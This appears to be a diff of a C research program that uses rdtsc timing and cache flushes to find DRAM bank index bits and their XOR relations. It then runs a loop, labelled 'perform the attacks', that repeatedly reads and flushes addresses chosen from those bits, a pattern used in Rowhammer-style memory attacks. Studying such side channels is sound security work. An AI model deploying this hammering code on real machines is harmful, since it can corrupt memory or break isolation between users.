@@ -62,10 +62,10 @@ int main(int argc, char* argv[]) {
 
 		printf("Bit %d: %lu cycles\n", bit, (end - start));
 	}
-*/
 
+*/
 /**********************Setp2: identify the bank indexes (shoter time)*****************************/
-/*	for (bit=6; bit<30; bit++) {
+/*	for (bit=1; bit<30; bit++) {
 		offset = ((1<<23) + (1<<bit))/sizeof(uint8_t);
 
 		start = rdtsc();
@@ -79,11 +79,11 @@ int main(int argc, char* argv[]) {
 
 		printf("Bit %d: %lu cycles\n", bit, (end - start));
 	}
+
 */
 
-/**********************Setp3: perform the attacks*****************************/
+/**********************Setp3: identify the XOR relation*****************************/
 	int bank_index[6];
-	int access_index[64];
 
 	bank_index[0] = 6;
 	bank_index[1] = 7;
@@ -91,6 +91,24 @@ int main(int argc, char* argv[]) {
 	bank_index[3] = 16;
 	bank_index[4] = 20;
 	bank_index[5] = 21;
+
+	int bit1, bit2;
+	for (bit1=0; bit1<5; bit1++) {
+		for (bit2=bit1+1; bit2<6; bit2++) {
+			offset = ((1<<bank_index[bit1]) + (1<<bank_index[bit2]))/sizeof(uint8_t);
+			start = rdtsc();
+			for (i=0; i<ROUND_NR/2; i++) {
+				next += mem_chunk[0];
+				cache_flush(&mem_chunk[0]);
+				next -= mem_chunk[offset];
+				cache_flush(&mem_chunk[offset]);
+			}
+			end = rdtsc();
+			printf("Bit %d XOR %d: %lu cycles\n", bank_index[bit1],bank_index[bit2], (end - start));
+		}
+	}
+/**********************Setp3: perform the attacks*****************************/
+	int access_index[64];
 
 	for (i=0; i<64; i++) {
 		access_index[i] = (((i>>5)&0x1)<<bank_index[5])/sizeof(uint8_t) +
@@ -101,7 +119,7 @@ int main(int argc, char* argv[]) {
 				  (((i>>0)&0x1)<<bank_index[0])/sizeof(uint8_t);
 	}
 
-	for (i=0; i<ROUND_NR; i++) {
+	for (i=0; i<ROUND_NR/2; i++) {
 		for (j=0; j<64; j++) {
 				next += mem_chunk[access_index[j]];
 				cache_flush(&mem_chunk[access_index[j]]);
